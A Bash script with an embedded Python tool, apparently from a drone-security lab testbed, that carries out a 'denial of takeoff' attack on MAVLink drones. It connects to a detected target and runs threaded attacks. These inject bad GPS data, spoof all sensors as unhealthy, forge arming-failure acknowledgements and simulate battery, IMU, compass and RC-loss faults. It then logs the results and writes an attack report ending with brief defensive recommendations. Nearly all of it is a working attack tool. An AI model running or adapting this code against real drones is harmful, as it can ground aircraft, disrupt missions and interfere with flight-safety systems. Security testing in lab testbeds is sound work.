#!/bin/bash
# denial_of_takeoff.sh - 이륙 거부 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/denial_of_takeoff.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Denial of Takeoff Attack"
LOG_FILE="$(get_log_dir)/denial_of_takeoff.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║           이륙 거부 공격             ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Python 라이브러리 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing pymavlink..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    log_success "Prerequisites check completed"
}

detect_mavlink_targets() {
    log_info "Detecting MAVLink targets..."
    
    local targets=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        targets+=("192.168.13.1:5760" "192.168.13.14:14550")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        targets+=("10.13.0.3:5760" "10.13.0.4:14550")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        targets+=("127.0.0.1:5760" "127.0.0.1:14550")
        log_warning "Generic network mode, using localhost targets"
    fi
    
    echo -e "${CYAN}Potential MAVLink targets:${NC}"
    for target in "${targets[@]}"; do
        echo "  └─ $target"
    done
    
    echo "$network_mode:${targets[*]}"
}

test_mavlink_connectivity() {
    local target="$1"
    
    log_info "Testing connectivity to $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    # 포트 연결 테스트
    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
        log_success "Connection to $target successful"
        return 0
    else
        log_warning "Connection to $target failed"
        return 1
    fi
}

create_takeoff_denial_script() {
    local script_path="/tmp/denial_of_takeoff.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
이륙 거부 공격 스크립트
"""

import sys
import time
import threading
from pymavlink import mavutil

class TakeoffDenialAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.attack_active = False
        self.attack_threads = []
        self.connect()
    
    def connect(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            print(f"[+] Connected to drone at {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_prearm_status(self):
        """Pre-arm 상태 확인"""
        print("[*] Checking pre-arm status...")
        
        try:
            # 시스템 상태 요청
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_REQUEST_MESSAGE,
                0,
                mavutil.mavlink.MAVLINK_MSG_ID_SYS_STATUS,
                0, 0, 0, 0, 0, 0
            )
            
            # 상태 메시지 수신
            msg = self.master.recv_match(type='SYS_STATUS', blocking=True, timeout=5)
            if msg:
                print(f"[+] System Status: {msg.onboard_control_sensors_health}")
                print(f"[+] Battery: {msg.voltage_battery/1000:.1f}V")
                print(f"[+] Current: {msg.current_battery/100:.1f}A")
                return True
            else:
                print("[-] No system status received")
                return False
                
        except Exception as e:
            print(f"[-] Status check failed: {e}")
            return False
    
    def inject_gps_glitch(self):
        """GPS 글리치 주입"""
        print("[*] Injecting GPS glitch...")
        
        while self.attack_active:
            try:
                # 불량한 GPS 데이터 전송
                self.master.mav.gps_raw_int_send(
                    time_usec=int(time.time() * 1e6),
                    fix_type=1,  # No GPS fix
                    lat=0,
                    lon=0,
                    alt=0,
                    eph=9999,  # Very high horizontal error
                    epv=9999,  # Very high vertical error
                    vel=0,
                    cog=0,
                    satellites_visible=0  # No satellites
                )
                
                print("[!] Bad GPS data injected")
                time.sleep(2)
                
            except Exception as e:
                print(f"[-] GPS injection error: {e}")
                break
    
    def spoof_unhealthy_sensors(self):
        """비정상 센서 상태 스푸핑"""
        print("[*] Spoofing unhealthy sensor status...")
        
        while self.attack_active:
            try:
                # 센서 건강 상태를 모두 비정상으로 설정
                self.master.mav.sys_status_send(
                    onboard_control_sensors_present=0xFFFFFFFF,
                    onboard_control_sensors_enabled=0xFFFFFFFF,
                    onboard_control_sensors_health=0x00000000,  # All unhealthy
                    load=900,  # High CPU load
                    voltage_battery=10000,  # Low voltage (10V)
                    current_battery=100,
                    battery_remaining=15,  # Low battery
                    drop_rate_comm=50,  # High packet drop
                    errors_comm=100,
                    errors_count1=10,
                    errors_count2=10,
                    errors_count3=10,
                    errors_count4=10
                )
                
                print("[!] Unhealthy sensor status spoofed")
                time.sleep(3)
                
            except Exception as e:
                print(f"[-] Sensor spoofing error: {e}")
                break
    
    def block_arming_commands(self):
        """무장 명령 차단"""
        print("[*] Blocking arming commands...")
        
        while self.attack_active:
            try:
                # 무장 거부 응답 전송
                self.master.mav.command_ack_send(
                    command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                    result=mavutil.mavlink.MAV_RESULT_FAILED
                )
                
                print("[!] Arming command blocked")
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] Command blocking error: {e}")
                break
    
    def inject_safety_violations(self):
        """안전 위반 조건 주입"""
        print("[*] Injecting safety violations...")
        
        violations = [
            ("Battery Critical", self.inject_battery_critical),
            ("IMU Error", self.inject_imu_error),
            ("Compass Error", self.inject_compass_error),
            ("RC Signal Loss", self.inject_rc_loss)
        ]
        
        while self.attack_active:
            for violation_name, violation_func in violations:
                if self.attack_active:
                    print(f"[!] Injecting: {violation_name}")
                    violation_func()
                    time.sleep(5)
    
    def inject_battery_critical(self):
        """배터리 위험 상태 주입"""
        try:
            self.master.mav.battery_status_send(
                id=0,
                battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
                type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
                temperature=400,  # High temperature
                voltages=[3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000],
                current_battery=2000,  # High current
                current_consumed=8000,  # High consumption
                energy_consumed=-1,
                battery_remaining=5  # Critical level
            )
        except Exception as e:
            print(f"[-] Battery injection error: {e}")
    
    def inject_imu_error(self):
        """IMU 오류 주입"""
        try:
            # 비정상적인 관성 데이터
            self.master.mav.raw_imu_send(
                time_usec=int(time.time() * 1e6),
                xacc=32767,  # Max acceleration (error)
                yacc=32767,
                zacc=32767,
                xgyro=32767,  # Max gyro (error)
                ygyro=32767,
                zgyro=32767,
                xmag=32767,   # Max magnetometer (error)
                ymag=32767,
                zmag=32767
            )
        except Exception as e:
            print(f"[-] IMU injection error: {e}")
    
    def inject_compass_error(self):
        """나침반 오류 주입"""
        try:
            # 비정상적인 자기계 데이터
            self.master.mav.scaled_imu_send(
                time_boot_ms=int(time.time() * 1000),
                xacc=0, yacc=0, zacc=0,
                xgyro=0, ygyro=0, zgyro=0,
                xmag=9999,  # Abnormal magnetic field
                ymag=9999,
                zmag=9999
            )
        except Exception as e:
            print(f"[-] Compass injection error: {e}")
    
    def inject_rc_loss(self):
        """RC 신호 손실 주입"""
        try:
            # RC 신호 없음
            self.master.mav.rc_channels_send(
                time_boot_ms=int(time.time() * 1000),
                chancount=8,
                chan1_raw=0, chan2_raw=0, chan3_raw=0, chan4_raw=0,
                chan5_raw=0, chan6_raw=0, chan7_raw=0, chan8_raw=0,
                chan9_raw=0, chan10_raw=0, chan11_raw=0, chan12_raw=0,
                chan13_raw=0, chan14_raw=0, chan15_raw=0, chan16_raw=0,
                chan17_raw=0, chan18_raw=0,
                rssi=0  # No signal
            )
        except Exception as e:
            print(f"[-] RC injection error: {e}")
    
    def monitor_prearm_checks(self, duration=60):
        """Pre-arm 검사 모니터링"""
        print(f"[*] Monitoring pre-arm checks for {duration} seconds...")
        
        start_time = time.time()
        prearm_events = []
        
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(blocking=False, timeout=1)
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'STATUSTEXT':
                        text = msg.text.decode('utf-8', errors='ignore')
                        if 'prearm' in text.lower() or 'arm' in text.lower():
                            prearm_events.append({
                                'timestamp': time.time(),
                                'text': text
                            })
                            print(f"[*] Pre-arm message: {text}")
                    
                    elif msg_type == 'COMMAND_ACK':
                        if msg.command == mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM:
                            result_names = {
                                0: "ACCEPTED",
                                1: "TEMPORARILY_REJECTED",
                                2: "DENIED",
                                3: "UNSUPPORTED",
                                4: "FAILED"
                            }
                            result = result_names.get(msg.result, f"UNKNOWN({msg.result})")
                            print(f"[*] Arming result: {result}")
                            
                            prearm_events.append({
                                'timestamp': time.time(),
                                'text': f"Arming {result}"
                            })
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] Monitoring completed. {len(prearm_events)} events captured")
        return prearm_events
    
    def start_comprehensive_attack(self, duration=120):
        """종합적인 이륙 거부 공격 시작"""
        print(f"[*] Starting comprehensive takeoff denial attack for {duration} seconds...")
        
        self.attack_active = True
        
        # 다중 공격 스레드 시작
        attack_methods = [
            ("GPS Glitch", self.inject_gps_glitch),
            ("Sensor Spoofing", self.spoof_unhealthy_sensors),
            ("Arming Block", self.block_arming_commands),
            ("Safety Violations", self.inject_safety_violations)
        ]
        
        for method_name, method_func in attack_methods:
            thread = threading.Thread(target=method_func, name=method_name)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            print(f"[+] Started {method_name} attack thread")
            time.sleep(1)
        
        # 공격 지속
        time.sleep(duration)
        
        # 공격 중지
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("[*] Stopping takeoff denial attack...")
        
        self.attack_active = False
        
        # 모든 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=5)
        
        print("[+] All attack threads stopped")
    
    def test_takeoff_attempt(self):
        """이륙 시도 테스트"""
        print("[*] Testing takeoff attempt...")
        
        try:
            # 무장 시도
            print("[*] Attempting to arm...")
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,
                1, 0, 0, 0, 0, 0, 0
            )
            
            # 응답 대기
            msg = self.master.recv_match(type='COMMAND_ACK', blocking=True, timeout=10)
            if msg and msg.command == mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM:
                if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                    print("[+] Arming ACCEPTED - Attack failed")
                    return False
                else:
                    print(f"[+] Arming DENIED (result: {msg.result}) - Attack successful")
                    return True
            else:
                print("[-] No arming response received")
                return False
                
        except Exception as e:
            print(f"[-] Takeoff test error: {e}")
            return False

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 denial_of_takeoff.py <ip> <port> <action>")
        print("Actions:")
        print("  status           - Check pre-arm status")
        print("  gps_glitch       - Inject GPS glitch")
        print("  sensor_spoof     - Spoof unhealthy sensors")
        print("  block_arming     - Block arming commands")
        print("  safety_violations- Inject safety violations")
        print("  test_takeoff     - Test takeoff attempt")
        print("  comprehensive    - Full denial attack")
        print("  monitor          - Monitor pre-arm checks")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    action = sys.argv[3]
    
    # 공격 객체 생성
    attack = TakeoffDenialAttack(target_ip, target_port)
    
    if not attack.master:
        print("[-] Failed to connect to target")
        sys.exit(1)
    
    try:
        # 액션 실행
        if action == "status":
            attack.check_prearm_status()
        elif action == "gps_glitch":
            attack.attack_active = True
            attack.inject_gps_glitch()
        elif action == "sensor_spoof":
            attack.attack_active = True
            attack.spoof_unhealthy_sensors()
        elif action == "block_arming":
            attack.attack_active = True
            attack.block_arming_commands()
        elif action == "safety_violations":
            attack.attack_active = True
            attack.inject_safety_violations()
        elif action == "test_takeoff":
            attack.test_takeoff_attempt()
        elif action == "comprehensive":
            attack.start_comprehensive_attack(120)
        elif action == "monitor":
            attack.monitor_prearm_checks(60)
        else:
            print(f"[-] Unknown action: {action}")
    
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
        attack.stop_attack()

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_takeoff_denial_attack() {
    local target="$1"
    local attack_type="$2"
    local duration="${3:-60}"
    
    log_info "Executing takeoff denial attack against $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_takeoff_denial_script)
    
    echo -e "${YELLOW}[*] Target: $target${NC}"
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "gps_glitch")
            echo -e "${RED}[!] Injecting GPS glitch${NC}"
            timeout "$duration" python3 "$script_path" "$ip" "$port" "gps_glitch" >/dev/null 2>&1 &
            local attack_pid=$!
            sleep "$duration"
            kill $attack_pid 2>/dev/null
            attack_output="GPS glitch injection completed"
            success=true
            ;;
        "sensor_spoof")
            echo -e "${RED}[!] Spoofing unhealthy sensors${NC}"
            timeout "$duration" python3 "$script_path" "$ip" "$port" "sensor_spoof" >/dev/null 2>&1 &
            local attack_pid=$!
            sleep "$duration"
            kill $attack_pid 2>/dev/null
            attack_output="Sensor spoofing completed"
            success=true
            ;;
        "comprehensive")
            echo -e "${RED}[!] Comprehensive takeoff denial${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "comprehensive" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "test_takeoff")
            echo -e "${CYAN}[*] Testing takeoff capability${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "test_takeoff" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "Takeoff denial attack executed successfully"
    else
        log_warning "Takeoff denial attack may have failed"
    fi
    
    rm -f "$script_path"
    
    echo "$success:$attack_output"
}

check_prearm_status() {
    local target="$1"
    
    log_info "Checking pre-arm status..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_takeoff_denial_script)
    
    echo -e "${CYAN}Checking pre-arm status of $target...${NC}"
    
    local status_output=$(python3 "$script_path" "$ip" "$port" "status" 2>&1)
    
    echo "$status_output"
    
    # 상태 분석
    if echo "$status_output" | grep -q "System Status"; then
        echo -e "${GREEN}  └─ System status retrieved${NC}"
    else
        echo -e "${YELLOW}  └─ System status unavailable${NC}"
    fi
    
    rm -f "$script_path"
}

perform_systematic_denial() {
    local target="$1"
    
    log_info "Performing systematic takeoff denial..."
    
    local denial_methods=(
        "gps_glitch:GPS signal corruption:30"
        "sensor_spoof:Sensor health spoofing:30"
        "test_takeoff:Takeoff capability test:10"
        "comprehensive:Comprehensive denial:60"
    )
    
    echo -e "${GREEN}=== Systematic Takeoff Denial ===${NC}"
    
    local method_results=()
    local successful_methods=0
    
    for method in "${denial_methods[@]}"; do
        local attack_type=$(echo "$method" | cut -d: -f1)
        local description=$(echo "$method" | cut -d: -f2)
        local duration=$(echo "$method" | cut -d: -f3)
        
        echo -e "\n${CYAN}[*] Method: $description (${duration}s)${NC}"
        
        local result=$(execute_takeoff_denial_attack "$target" "$attack_type" "$duration")
        local success=$(echo "$result" | cut -d: -f1)
        
        if [[ "$success" == "true" ]]; then
            ((successful_methods++))
            method_results+=("$description:SUCCESS")
            echo -e "${GREEN}  └─ Method succeeded${NC}"
        else
            method_results+=("$description:FAILED")
            echo -e "${RED}  └─ Method failed${NC}"
        fi
        
        # 메소드 간 대기
        sleep 5
    done
    
    echo -e "\n${GREEN}=== Denial Summary ===${NC}"
    echo "  └─ Total methods: ${#denial_methods[@]}"
    echo "  └─ Successful methods: $successful_methods"
    echo "  └─ Success rate: $((successful_methods * 100 / ${#denial_methods[@]}))%"
    
    echo -e "\n${CYAN}Method Details:${NC}"
    for result in "${method_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_methods:${#denial_methods[@]}"
}

monitor_prearm_checks() {
    local target="$1"
    local monitoring_duration="${2:-60}"
    
    log_info "Monitoring pre-arm checks..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_takeoff_denial_script)
    
    echo -e "${YELLOW}[*] Monitoring pre-arm checks for ${monitoring_duration} seconds...${NC}"
    
    local monitor_output=$(python3 "$script_path" "$ip" "$port" "monitor" 2>&1)
    
    echo "$monitor_output"
    
    # Pre-arm 이벤트 분석
    local prearm_events=$(echo "$monitor_output" | grep -i "pre-arm\|prearm" | wc -l)
    local arming_attempts=$(echo "$monitor_output" | grep -i "arming" | wc -l)
    local denials=$(echo "$monitor_output" | grep -i "denied\|failed\|rejected" | wc -l)
    
    echo -e "${GREEN}=== Pre-arm Monitoring Summary ===${NC}"
    echo "  └─ Pre-arm events: $prearm_events"
    echo "  └─ Arming attempts: $arming_attempts"
    echo "  └─ Denials/Failures: $denials"
    echo "  └─ Monitoring duration: ${monitoring_duration}s"
    
    if [[ $denials -gt 0 ]]; then
        echo -e "${RED}  └─ Takeoff denial detected${NC}"
    else
        echo -e "${GREEN}  └─ No takeoff denials observed${NC}"
    fi
    
    rm -f "$script_path"
}

generate_takeoff_denial_report() {
    local target="$1"
    local attack_summary="$2"
    
    log_info "Generating takeoff denial attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/denial_of_takeoff_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║              이륙 거부 공격 보고서                ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: Denial of Takeoff
Target: $target
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target System: MAVLink Drone
Attack Vector: Pre-arm Check Interference
Protocol: MAVLink (TCP)
Attack Methods:
  - GPS signal corruption
  - Sensor health spoofing
  - Safety violation injection
  - Arming command blocking

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 20 "Systematic Takeoff Denial" | tail -20)

╔═══ PRE-ARM MONITORING ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Pre-arm Monitoring Summary" | tail -10)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Flight Safety Override
   - Pre-arm check manipulation
   - Safety system bypass prevention
   - Takeoff authorization denial

2. Operational Impact
   - Mission launch prevention
   - Asset deployment denial
   - Time-critical operation disruption

3. System Integrity
   - Sensor data corruption
   - Navigation system interference
   - Flight controller confusion

╔═══ ATTACK MECHANISMS ═══╗

1. GPS Signal Corruption
   - Invalid position data injection
   - Satellite count manipulation
   - Accuracy degradation

2. Sensor Health Spoofing
   - System status manipulation
   - Health check interference
   - Error condition simulation

3. Safety Violation Injection
   - Battery critical simulation
   - IMU error generation
   - RC signal loss simulation

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Mission Prevention
   - Critical mission disruption
   - Time-sensitive operation denial
   - Asset deployment interference

2. Operational Denial
   - Flight capability elimination
   - Service availability reduction
   - System readiness compromise

3. Safety System Abuse
   - False alarm generation
   - Emergency condition simulation
   - Maintenance requirement triggering

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 센서 데이터 검증
   - 다중 센서 크로스체크
   - 데이터 무결성 검증
   - 이상치 탐지 구현

2. 명령 인증 강화
   - Pre-arm 명령 서명
   - 센서 데이터 암호화
   - 무결성 검사 강화

3. 시스템 모니터링
   - 비정상 센서 데이터 탐지
   - Pre-arm 실패 패턴 분석
   - 센서 상태 실시간 감시

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/denial_of_takeoff.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting denial of takeoff attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # MAVLink 타겟 탐지
    local target_info=$(detect_mavlink_targets)
    local network_mode=$(echo "$target_info" | cut -d: -f1)
    local targets=($(echo "$target_info" | cut -d: -f2-))
    
    # 연결 가능한 타겟 찾기
    local active_target=""
    for target in "${targets[@]}"; do
        if test_mavlink_connectivity "$target"; then
            active_target="$target"
            break
        fi
    done
    
    if [[ -z "$active_target" ]]; then
        log_error "No active MAVLink targets found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active target: $active_target${NC}"
    
    # Pre-arm 상태 확인
    echo -e "\n${BLUE}[*] Checking pre-arm status...${NC}"
    check_prearm_status "$active_target" | tee -a "$LOG_FILE"
    
    # 체계적 거부 공격 실행
    echo -e "\n${BLUE}[*] Executing systematic denial attacks...${NC}"
    local attack_summary=$(perform_systematic_denial "$active_target")
    
    # Pre-arm 모니터링
    echo -e "\n${BLUE}[*] Monitoring pre-arm checks...${NC}"
    monitor_prearm_checks "$active_target" 60 | tee -a "$LOG_FILE"
    
    # 보고서 생성
    generate_takeoff_denial_report "$active_target" "$attack_summary"
    
    cleanup
    
    log_success "Denial of takeoff attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"